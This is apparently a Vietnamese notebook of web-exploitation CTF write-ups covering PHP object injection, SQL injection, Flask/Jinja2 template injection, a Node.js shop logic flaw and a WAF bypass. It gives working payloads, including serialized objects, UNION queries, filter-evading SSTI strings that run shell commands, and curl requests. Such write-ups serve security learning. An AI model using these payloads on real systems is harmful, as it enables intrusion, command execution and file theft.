# Các lỗ hỏng bảo mật web mà mình ghi nhận lại
Các lỗ hỏng web phổ thông từ các giải CTF.
# Danh sách các mục

- [Các lỗ hỏng bảo mật web mà mình ghi nhận lại](#các-lỗ-hỏng-bảo-mật-web-mà-mình-ghi-nhận-lại)
  - [Danh sách các mục](#danh-sách-các-mục)
    - [PHP](#php)
      - [POP chain](#Pop-chain)
      - [Co gion khong](#co-gion-khong)
    - [SQL injection](#SQL-Injection)
      - [SQL Maxter](#sql-maxter)
      - [Inj3ction Time](#inj3ction-time)
    - [Flask](#flask)
      - [EHC Hair Salon](#ehc-hair-salon)
    - [Prototype Pollution](#prototype-pollution)
      - [Fruit Store](#fruit-store)
    - [WAF](#WAF)
      - [Simple WAF](#Simple-WAF)

---

## PHP

## POP chain

- Tổng quan: là lỗ hỏng phát hiện trên PHP 7, cho phép tấn công bằng nhiều cách khác nhau như: Code Injection, SQL Injection, Path Traversal và Application Denial of Service. Tham khảo thêm tại [đây](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection) hoặc tại [đây](https://viblo.asia/p/tong-quan-ve-phuong-phap-tan-cong-deserialization-trong-php-bJzKmR4wZ9N)
- Dấu hiệu nhận biết: là code PHP, có sử dụng [magic method](https://www.php.net/manual/en/language.oop5.magic.php), có sử dụng từ khóa như **unserialize**, **serialize**

---

### Co gion khong

Đây là source của bài:

```php/
    <?php
    error_reporting(0);
    highlight_file(__FILE__);

    class main{
        public $class;
        public $param;
        public function __construct($class="test",$param="Onion")
        {
            $this->class = $class;
            $this->param = $param;
            echo new $this->class($this->param);
        }
        public function __destruct(){
            echo new $this->class->cc($this->param);
        }

    }

    class test{
        var $str;
        public function __construct($str)
        {
            $this->str = $str;
            echo ("Welcome to ".$this->str);
        }
    }

    class do_nothing{
        public $a;
        public $b;
        public function __construct($a,$b){
            $this->a = $a;
            $this->b = $b;
        }
        public function __get($method){
            if(isset($this->a)){
                return $this->b;
            }
            return $method;
        }
    }

    if(isset($_GET['payload'])){
        unserialize(base64_decode($_GET['payload']));
        throw new Exception("ga");
    }
    else{
        $main = new main;

    } Welcome to Onion
```

- Phân tích code PHP:
Nhìn tổng quan thì bài này có những class `main`, `test`, `do_nothing`
  - class `main` có chứa 2 magic method: `__construct($class="test",$param="Onion")` - mục đích là in ra giá trị của `$param`, và `__destruct()` - in ra output của class `cc()` vói tham số của `$param`
  - class `test` có 1 magic method: `__construct($str)` - in ra dòng `"Welcome to ".$this->str)` ở đây là "Welcome to Onion"
  - class `do_nothing` có 2 magic method `__construct($a,$b)` - gán giá trị bằng tham số a, b truyền vào, `__get($method)` - nhận `$method`
  - Phần quan trọng là xử lý payload:

  ```php
    if(isset($_GET['payload'])){
        unserialize(base64_decode($_GET['payload']));
        throw new Exception("ga");
    }
    else{
        $main = new main;
  ```

  hàm sẽ GET dữ liệu về thông qua `payload` truyền vào, sau đó là chạy hàm unserialize, giải mã base64 và thực thi `payload`  
- Hướng giải bài này:
Giả thiết, thi chạy hàm unserialize thì hàm main sẽ được gọi trước, method `__construct()` và `__destruct()` sẽ chạy, tuy nhiên trong method `__destruct()` tồn tại method `cc()` - không tồn tại trong source. Tiếp đó ta thấy method `__get($method)` có thể method này sẽ gọi method `cc()` nên có lẽ payload sẽ liên quan tới class `do_nothing`
Tiếp đến là ta không thấy được dấu hiệu flag trong source, vậy có thể flag sẽ được giấu trong server hệ thống, vậy nên có thể ta sẽ sử dụng phương pháp `Path travesal` để xâm nhập
Sau khi phân tích thì vẫn tương đối khó hiểu viết payload như nào, nên chúng ta sẽ phải mò xem, payload sẽ là code php được viết lại dựa trên source
Sau khi được senpai cho hint:
![](https://i.imgur.com/5W1PjsI.png)
Hint vẫn hơi còn mông lung, dựa trên hint0, thì sẽ là các class có sẵn, tìm với từ khóa: `Vulnerable class in php path travelsal` tuy nhiên vẫn không có gì hữu dụng cho lắm, sau khi đổi từ khóa thành `Native class file travelsal php`
ta tìm được trang này, sau 1 hồi mò công dụng các class thì mình thấy dược [`FilesystemIterator`](https://www.php.net/manual/en/class.filesystemiterator.php) và [`SplFileObject`](https://www.php.net/manual/en/class.splfileobject.php) là 2 class hợp với hint1
Sau khi tìm hiểu, đến lúc viết thử script
script.php

```php
    <?php

    class do_nothing{
        public function __construct(){
            $this->a = "a"; 
            $this->b = "FilesystemIterator";
        }
    }

    class main{
        public function __construct(){
            //point to class do_nothing
            $this->class = new do_nothing();
            //read all file
            $this->param = "./";
        }
    }

    //make obj point to method main
    $obj = new main();

    //triger method 
    echo (base64_encode((serialize($obj))));

    ?>
```

Sau khi chạy script thì ta được:
`payload=Tzo0OiJtYWluIjoyOntzOjU6ImNsYXNzIjtPOjEwOiJkb19ub3RoaW5nIjoyOntzOjE6ImEiO3M6MToiYSI7czoxOiJiIjtzOjE4OiJGaWxlc3lzdGVtSXRlcmF0b3IiO31zOjU6InBhcmFtIjtzOjI6Ii4vIjt`
![](https://i.imgur.com/y1a863b.png)
Có vẻ tồn tại 1 file hoặc folder là `ahyeah_flag_here_cat_me_plss`
Tiếp tục trong script.php, `./` thay thành `./ahyeah_flag_here_cat_me_plss/` để kiểm tra đây có phải là folder không
![](https://i.imgur.com/EK5IGt7.png)
Vậy là ta tìm thấy file chứa flag là flag.php, sửa lại 1 chút script

```php
    <?php

    class do_nothing{
        public function __construct(){
            $this->a = "a"; 
            $this->b = "SplFileObject";
        }
    }

    class main{
        public function __construct(){
            //point to class do_nothing
            $this->class = new do_nothing();
            $this->param = "./ahyeah_flag_here_cat_me_plss/flag.php";
        }
    }

    //make obj point to method main
    $obj = new main();

    //triger method 
    echo (base64_encode((serialize($obj))));

    ?>
```

Ta sẽ được payload:
`payload=Tzo0OiJtYWluIjoyOntzOjU6ImNsYXNzIjtPOjEwOiJkb19ub3RoaW5nIjoyOntzOjE6ImEiO3M6MToiYSI7czoxOiJiIjtzOjEzOiJTcGxGaWxlT2JqZWN0Ijt9czo1OiJwYXJhbSI7czozOToiLi9haHllYWhfZmxhZ19oZXJlX2NhdF9tZV9wbHNzL2ZsYWcucGhwIjt9`
**Lưu ý:** Flag sẽ không hiện thị lên, bấm F12 để view source ta sẽ thấy flag
`flag = 'FPTUHacking{Ch4ll nhu n4y c0 d0n kh0ng h1h1 !!!}`

## SQL injection

- Tổng quan: là 1 trong những lỗi phổ biến của sql, chèn 1 đoạn truy vấn từ máy khách đến ứng dụng, mục đích nhằm khai thác dữ liệu hoặc sửa đổi cơ sở dữ liệu, chi tiết tại [đây](https://owasp.org/www-community/attacks/SQL_Injection)
- Nhận diện: có sử dụng SQL, tham khảo thêm tại [đây](https://viblo.asia/p/huong-dan-test-sql-injection-vi-du-va-cach-phong-ngua-cac-cuoc-tan-cong-sql-injection-3P0lPYap5ox)

---

### SQL Maxter

Source code trong `getmission.phps`:

```php
<?php
include 'config.php';
include 'waf.php';

$heroname = $_POST['heroname'] ?? NULL;
$mission = $_POST['mission'] ?? NULL;

if(preg_match($waf, $heroname))
{
    die("Wrong way h4ck3r");
}

$hero  = "SELECT * FROM heroes WHERE name = '{$heroname}'";
$result = $mysqli->query($hero);

$enemy = "SELECT power FROM heroes WHERE name='boros'";
$enemy__power = $mysqli->query($enemy);

if ($result-> num_rows === 1) {
    $hero__info = $result->fetch_array();
    $enemy__power = $enemy__power->fetch_array();
    if ($hero__info['mission'] == $mission || $hero__info['power'] > $enemy__power['power']) {
        die($flag);
    } else {
        die("Mission failed");
    }
} else {
    die("Mission failed!!!");
}
?>
```

- Phân tích: ta thấy `$heroname = $_POST['heroname'] ?? NULL; $mission = $_POST['mission'] ?? NULL;` vậy ta có thể POST parameter `heroname` và `mission`. Tiếp đấy `SELECT * FROM heroes WHERE name = '{$heroname}'` có thể ta sẽ khai lỗ hỏng từ đây, mục tiêu của bài là lấy flag tại đây:

```php
    if ($result-> num_rows === 1) {
    $hero__info = $result->fetch_array();
    $enemy__power = $enemy__power->fetch_array();
    if ($hero__info['mission'] == $mission || $hero__info['power'] > $enemy__power['power']) {
        die($flag);
    } else {
        die("Mission failed");
    }
} else {
    die("Mission failed!!!");
}
```

Ta thấy được là `num_rows === 1` nếu không hợp lệ thì sẽ trả về `"Mission failed!!!"` và điều kiện lấy flag là `$hero__info['mission'] == $mission` hoặc`$hero__info['power'] > $enemy__power['power']`,

- Tiến hành: thử nhập 1 số payload thì ta nhận ra là web sẽ filter `and` nên ta sẽ dùng `&&` thay thế. Payload: `saitama'&&mission like binary '{char}%'-- -` phần này sẽ phải bruteforce để lấy được thông tin mission: 1b134ba1348f52010869589149240599. Tiếp đó gửi lên server, ta thu được flag:`Wanna One{U_1s_r3al_h4ck3rxD:))}`

### Inj3ction Time

Bài này thì không có source, chỉ có phần interface để tương tác, ta có thể thấy có ID và data ở dưới nên bài này sẽ dùng SQL injection
![](https://i.imgur.com/LAEjEX2.png)

- Phân tích:
  - Chỉ có 1 phần phần nhập và nút submit
  - Thử 1 số payload phổ biết của SQL injection, tuy nhiên kết quả không khả quan mấy, và phát hiện là dấu ` và -- không cần sử dụng
  ![](https://i.imgur.com/nLzjCfb.png)
- Hướng giải quyết
  - Tìm trên google với từ khóa `blind sql injection attack` và ta thấy ngay [kết quả](https://portswigger.net/web-security/sql-injection/union-attacks) đầu tiên có đề cập tới syntax Union trong SQL, tìm tiếp với `union in sql injection` ta thấy được cách hoạt động ở [kết quả](https://portswigger.net/web-security/sql-injection/union-attacks) đầu, mục đích là kiểm tra bảng của SQL
  - Kiểm tra bằng payload `1 UNION SELECT NULL,NULL,NULL,NULL` và nó hoạt động tốt
  ![](https://i.imgur.com/aCJfzWL.png)
Mò tiếp các payload phổ biến của Union tại [đây](https://github.com/payloadbox/sql-injection-payload-list)
Thay `NULL` thành `@@VERSION` ta được payload: `1 UNION SELECT @@VERSION,@@VERSION,@@VERSION,@@VERSION`
![](https://i.imgur.com/et5amn5.png)
Ta thấy được server đang dùng MySQL phiên bản `5.5.58-0ubuntu0.14.04.1`. Tiếp ta sẽ kiểm tra bảng bằng [`INFORMATION_SCHEMA.TABLES`](https://www.mssqltips.com/sqlservertutorial/196/information-schema-tables/) bằng `1 UNION SELECT TABLE_NAME,NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES`
![](https://i.imgur.com/sU0HOv9.png)
ta tìm thấy 1 bảng tên `w0w_y0u_f0und_m3`
`1 UNION SELECT COLUMN_NAME,NULL,NULL,NULL FROM INFORMATION_SCHEMA.COLUMNS`
![](https://i.imgur.com/mQNFs7F.png)
ta tìm thấy cột tên `f0und_m3`
Vậy payload hoàn chỉnh `1 UNION SELECT  f0und_m3, NULL, NULL, NULL FROM w0w_y0u_f0und_m3`
![](https://i.imgur.com/trcuRpd.png)
Flag: `abctf{uni0n_1s_4_gr34t_c0mm4nd}`

## Flask

- Tổng quan: Flask là framework chuyên về fontend của python, chi tiết tại [đây](https://flask.palletsprojects.com/en/2.1.x/)
- Nhận diện: sử dụng python, có khai báo thư viện `import Flask`

---

### EHC Hair Salon

Source:

```python
    import re
    from flask import Flask, render_template_string, request

    app = Flask(__name__)
    regex = "request|config|self|class|flag|0|1|2|3|4|5|6|7|8|9|\"|\'|\\|\~|\%|\#"

    error_page = '''
            {% extends "layout.html" %}
            {% block body %}
            <center>
               <section class="section">
                  <div class="container">
                     <h1 class="title">Ông cháu à!</h1>
                     <p>Ông chú chỉ cắt được quả đầu Tommy Xiaomi thôi!</p>
                  </div>
               </section>
            </center>
            {% endblock %}
            '''


    @app.route('/', methods=['GET', 'POST'])
    def index():
        if request.method == 'POST':
            if not request.form['hair']:
                return render_template_string(error_page)

            if len(request.form) > 1:
                return render_template_string(error_page)

            hair_type = request.form['hair'].lower()
            if '{' in hair_type and re.search(regex,hair_type):
                return render_template_string(error_page)

            if len(hair_type) > 256:
                return render_template_string(error_page)

            page = \
                '''
            {{% extends "layout.html" %}}
            {{% block body %}}
            <center>
               <section class="section">
                  <div class="container">
                     <h1 class="title">Dậy đi ông cháu ơi, cắt xong rồi nhé!</h1>
                     <ul class=flashes>
                        <label>Ông cháu có quả đầu {} thanh toán tiền cho chú nào <3</label>
                     </ul>
                     </br>
                  </div>
               </section>
               <iframe width="560" height="315" src="https://v16m-webapp.tiktokcdn-us.com/2f678d478e2de26a048aaf4f3ed6d8bd/62b6f7f3/video/tos/useast2a/tos-useast2a-pve-0037-aiso/dd6e434a38e4447e83f61a684c31583b/?a=1988&ch=0&cr=0&dr=0&lr=tiktok&cd=0%7C0%7C0%7C0&br=1302&bt=651&cs=0&ds=1&ft=ebtHKHk_Myq8Z4IeUwe2NsE~fl7Gb&mime_type=video_mp4&qs=0&rc=ZThoZWk7Zzw3PGQ1NmVnM0BpM3VsZWg6ZjhzZDMzZjgzM0AzLjIyYC8tX2AxYGFhMjVhYSNnMS9kcjQwMC1gLS1kL2Nzcw%3D%3D&l=202206250556040100040040250040050060030180F0D3C2C" frameborder="0" allowfullscreen></iframe>
          </iframe>
            </center>
            {{% endblock %}}
            '''.format(hair_type)

        elif request.method == 'GET':
            page = \
                '''
            {% extends "layout.html" %}
            {% block body %}
            <center>
                <section class="section">
                  <div class="container">
                     <h1 class="title">Chào mừng đến với <a href="https://www.facebook.com/ehc.fptu">EHC Hair Salon</a>, hôm nay ông cháu này muốn cắt quả đầu nào nhể?</h1>
                     <p>Nhập tên quả đầu mà ông cháu muốn cắt nha!</p>
                     <form action='/' method='POST' align='center'>
                        <p><input name='hair' style='text-align: center;' type='text' placeholder='Tommy Xiaomi' /></p>
                        <p><input value='Submit' style='text-align: center;' type='submit' /></p>
                     </form>
                  </div>
               </section>
            </center>
            {% endblock %}
            '''
        return render_template_string(page)


    app.run('0.0.0.0', 8000)
```

![](https://i.imgur.com/JQMbGZV.png)

- Phân tích đề:
  - Nhìn vào trang web thì ta chỉ thấy được 1 ô nhập vào để submit, vậy chúng ta sẽ cần nhập payload vào đây
  - Phân tích source: code sử dụng framework flask của python vậy nên sẽ là lỗi của flask. Tại phần khai báo: `from flask import Flask, render_template_string, request`, ta thấy được web này render bằng template, tra google bằng từ khóa `template flask` thì kết quả thu được là template engine [`Jinja`](https://jinja.palletsprojects.com/en/3.1.x/), tra tiếp google `jinja template vulnerability` thì kết quả đầu tiên ta thấy [được](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) là chúng ta có nhập 1 số payload [ssti](https://portswigger.net/research/server-side-template-injection) nhất định thì sẽ inject được website
Test thử payload `[<class '__main__.D'>, <class '__main__.C'>, <class '__main__.A'>, <class '__main__.B'>, <class 'object'>]`
![](https://i.imgur.com/FyURie8.png)
Vậy là hướng đi này có thể là đúng, vấn đề tiếp theo ta cần là bypass filter: `regex = "request|config|self|class|flag|0|1|2|3|4|5|6|7|8|9|\"|\'|\\|\~|\%|\#"`
Mò tiếp source xem có thông tin gì thú vị không, ta thấy được
`if len(hair_type) > 256: return render_template_string(error_page)`
Vậy độ dài payload sẽ dưới 256 ký tự
- Cách giải quyết:
Sau khi tìm hiểu được lý do hoạt động của bug này ta tiến hành viết payload, mò tiếp google tìm lệnh cách triển khai thì ta [tại đây](https://programmer.group/ctfshow-question-brushing-diary-web-ssti-web361-372.html) có dòng: `{{cycler.__init__.__globals__.os.popen('ls').read()}}` tuy nhiên bị chặn bởi filter, đổi l: `().__doc__[[[],[],[]].__len__()]`, s: `().__str__.__name__[[[],[]].__len__()]`
Payload:
`{{cycler.__init__.__globals__.os.popen(().__doc__[[[],[],[]].__len__()]+().__str__.__name__[[[],[]].__len__()]).read()}}`
![](https://i.imgur.com/TMmn5Xt.png)
Có sau khi ls thì có file flag, dùng tiếp lệnh:
`{{get_flashed_messages.__globals__.__builtins__.open("flag").read()}}` tại [đây](https://0xhorizon.eu/writeups/fantasy_book/) mà flag cũng bị ban nên tiếp tục đổi:
`flag = [].__doc__[-[[],[],[],[],[]].__len__()]+\().__doc__[[[],[],[]].__len__()]+\().__add__.__name__[[[],[]].__len__()]+\().__gt__.__name__[[[],[]].__len__()]`
Payload:
`{{get_flashed_messages.__globals__.__builtins__.open([].__doc__[-[[],[],[],[],[]].__len__()]+().__doc__[[[],[],[]].__len__()]+().__add__.__name__[[[],[]].__len__()]+().__gt__.__name__[[[],[]].__len__()]).read()}}`
![](https://i.imgur.com/CWyuQ3a.png)
**Ghi chú:** các payload có thể tự mò trên console cũa python để kiểm tra kết quả trả về
Ta tìm được flag là: `FPTUHacking{d4y_d1_0ng_ch4u_0i,ban_da_thoat_khoi_EHC_hair_salon_roi}`

## Prototype Pollution

Là kỹ thuật tấn công nhắm vào javascript runtime nhằm kiểm sót các giá trị mặc định, giả mạo logic của ứng dụng nhằm ddos hoặc là thực thi mã đọc từ xa.

### Fruit Store

Coi toàn bộ source của bài tại [đây](https://github.com/Trumpiter-max/Tricks-in-web-exploit/tree/main/Storage/CTFs/Prototype%20Pollution/Fruit%20Store%20tjctf%202022).
Bắt đầu vào thì ta sẽ thấy giao diện như này:
![](https://i.imgur.com/cw0Ed7Z.png)
Nhìn vào code ta sẽ thấy:

```js
onst express = require('express');
const session = require('express-session');
const fs = require('fs');

const app = express();

const fruits = require('./inventory.json');

const fruit = {
    name: 'some fruit',
    price: 0.25,
    description: 'a fruit',
    quantity: 1
};

fruits['grass'] = {
    name: 'grass',
    price: 2.5e+25,
    description: fs.readFileSync('flag.txt', 'utf8').trim(),
    quantity: 1
};

app.use(express.json({ extended: true }));

app.set('view engine', 'ejs');

app.use(session({
    secret: require('crypto').randomBytes(64).toString('hex'),
    resave: false,
    saveUninitialized: true,
}));

app.use((req, res, next) => {
    if (req.session.money !== undefined)
        return next();

    req.session.money = 5;

    if (req.ip == '127.0.0.1') {
        req.session.admin = true;
    }

    next();
});

app.get('/', (req, res) => {
    res.render('index', { fruits, money: req.session.money });
});

app.post('/api/v1/sell', (req, res) => {
    for (const [key, value] of Object.entries(req.body)) {
        if (key === 'grass' && !req.session.admin) {
            continue;
        }

        if (!fruits[key]) {
            fruits[key] = JSON.parse(JSON.stringify(fruit));
        }

        for (const [k, v] of Object.entries(value)) {
            if (k === 'quantity') {
                fruits[key][k] += v;
            } else {
                fruits[key][k] = v;
            }
        }
    }

    res.send('Sell successful');
});

app.post('/api/v1/buy', (req, res) => {
    const { fruit, quantity } = req.body;

    if (typeof fruit === 'undefined' || typeof quantity !== 'number' || quantity <= 0 || !fruits[fruit]) {
        return res.status(400).send('Invalid request');
    }

    if (fruits[fruit].quantity >= quantity) {
        if (req.session.money >= fruits[fruit].price * quantity) {
            fruits[fruit].quantity -= quantity;
            req.session.money -= fruits[fruit].price * quantity;
            res.json(fruits[fruit]);
        } else {
            res.status(402).send('Not enough money');
        }
    } else {
        res.status(451).send('Not enough fruit');
    }
});

app.post('/api/v1/money', (req, res) => {
    if (req.session.admin) {
        req.session.money += req.body.money;
        res.send('Money added');
    } else {
        res.status(403).send('Not admin');
    }
});

app.listen(3000, () => {
    console.log('Listening on port 3000');
});

```

- Phân tích source: ta thấy có 3 phần chính `/api/v1/sell`, `/api/v1/buy` và `/api/v1/money`, nhiệm vụ có vẻ ta phải mua được grass tuy nhiên giá lại cao hơn số tiền hiện có nên có vẻ ta phải thay đổi số tiền hiện có, ta có thể tăng tiền trong phần `/api/v1/money` tuy nhiên chỉ có admin mới làm được, `/api/v1/buy` có chức năng mua các vật phẩm, ta

```js
    if (fruits[fruit].quantity >= quantity) {
            if (req.session.money >= fruits[fruit].price * quantity) {
                fruits[fruit].quantity -= quantity;
                req.session.money -= fruits[fruit].price * quantity;
                res.json(fruits[fruit]);
            } else {
                res.status(402).send('Not enough money');
            }
        } else {
            res.status(451).send('Not enough fruit');
        }
    });
```

Giá tiền của loại trái cây sẽ bắng giá nhân với số lượng, và số lượng trái cây là số số trái cây trừ số lượng nhưng nếu số lượng là âm thì nó sẽ thành phép cộng, tương tự thế ta sẽ cộng thêm tiền cho `req.session.money` nếu `fruits[fruit].price * quantity` là số âm hay `quantity` là số âm

- Tiến hành: ta có thể dùng curl để gửi request:
  - `curl -X POST 'https://fruit-store-16ac1ecab524d650.tjc.tf/api/v1/sell' -H 'Content-Type: application/json' -H 'Cookie: connect.sid=s%3AQ-jvlbKwnUCNiMsiK09bLo7BcCqHuhey.rTsHWm1SpJX39O9itN%2Fjd6vZvJ0FsRHWdn86gKJrfzk' -d '{"banana": {"price":-10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000}}'`
màn hinh sẽ hiện ra Sell successful, nghĩa là ta đã bán thành công.
  - `curl -X POST 'https://fruit-store-16ac1ecab524d650.tjc.tf/api/v1/buy' -H 'Content-Type: application/json' -H 'Cookie: connect.sid=s%3AQ-jvlbKwnUCNiMsiK09bLo7BcCqHuhey.rTsHWm1SpJX39O9itN%2Fjd6vZvJ0FsRHWdn86gKJrfzk' -d '{"fruit":"banana","quantity":1}`
 Ta sẽ có kết quả:`{"name":"banana","price":-1e+100,"description":"banannananananannana","quantity":4}`
  - `curl -X POST 'https://fruit-store-16ac1ecab524d650.tjc.tf/api/v1/buy' -H 'Content-Type: application/json' -H 'Cookie: connect.sid=s%3AQ-jvlbKwnUCNiMsiK09bLo7BcCqHuhey.rTsHWm1SpJX39O9itN%2Fjd6vZvJ0FsRHWdn86gKJrfzk' -d '{"fruit":"grass","quantity":1}'`
Màn hình hiện ra và được flag:
`{"name":"grass","price":2.5e+25,"description":"tjctf{h4v3_y0u_ev3r_tri3d_gr4s5_j3l1y_d4ebd9}","quantity":0}`

Flag: `tjctf {h4v3_y0u_ev3r_tri3d_gr4s5_j3l1y_d4ebd9}`

## WAF

### Simple WAF
Source code coi [tại đây](https://github.com/Trumpiter-max/Tricks-in-web-exploit/tree/main/Storage/CTFs/WAF/SimpleWAF%20corctf2022)

Giao diện website khá là cơ bản, gồm index.html và wow.html. Nhìn tiếp trong source thì ta có thể thấy được là `flag.txt`, có vẻ đây là file chứa flag, tuy nhiên nếu thay `?file=flag.txt` thì web sẽ trả về `bad hacker`, vì filter `flag` trong `main.js`:
```js
    app.use((req, res, next) => {
    if([req.body, req.headers, req.query].some(
        (item) => item && JSON.stringify(item).includes("flag")
    )) {
        return res.send("bad hacker!");
    }
    next();
});
```
  - Phân tích đề: mục tiêu của chúng ta là mở được file `flag.txt`. Ta có syntax `some()` dùng để check điều kiện bên trong `some` với các phần tử trong mảng, tuy nhiên chúng ta chỉ có thể send request cho `req.query` bắng cách chỉnh giá trị parameter `?file=`. Dựa trên code trong file js: `const fs = require("fs");`, code sử dụng `module fs,` vậy ta có thể sử dụng [`fs.readFileSync`](https://github.com/nodejs/node/blob/v18.x/lib/fs.js): ` res.send(fs.readFileSync(req.query.file || "index.html").toString());` dường như là query phải là string, sau một lúc mò Internet thì tôi thấy được module [`query-string`](https://www.npmjs.com/package/query-string), nên ta có thể parse query.
  - Tiến hành giải quyết: thay thử `req.query.file || "index.html"` thành `new URL("file://app/flag.txt"` - theo cấu hình `DockerFile` thì flag trong workdir app, chạy thử thì ta thấy nó in ra nội dung của file flag, nên cách này có vẻ đúng. Đựa trên query-string, ta có thể viết query theo cấu trúc `foo[0]=1&foo[1]=2&foo[3]=3` và các function của module fs trong code thì ta có thể viết được payload: `?file[origin]=a&file[href]=a&file[protocol]=file:&file[hostname]=&file[pathname]=/app/%2566lag.txt` - encode flag =>` %66lag` =>` %2566lag`. Ta được flag: `corctf{hmm_th4t_waf_w4snt_s0_s1mple}`

###### tags: `CTFs` `Web Exploit`
